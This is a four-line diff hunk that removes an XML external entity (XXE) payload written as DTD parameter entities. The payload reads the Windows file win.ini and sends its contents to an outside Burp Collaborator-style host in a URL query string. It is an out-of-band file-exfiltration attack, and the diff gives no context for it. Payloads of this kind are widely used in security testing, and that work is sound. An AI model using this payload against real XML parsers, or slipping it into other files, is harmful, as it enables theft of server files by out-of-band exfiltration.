@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://8qzsa0em8eyrhqvh368kpe977ydp1fp4.burp.rtsh.uk/?x=%file;'>">
-%eval;
-%exfiltrate;
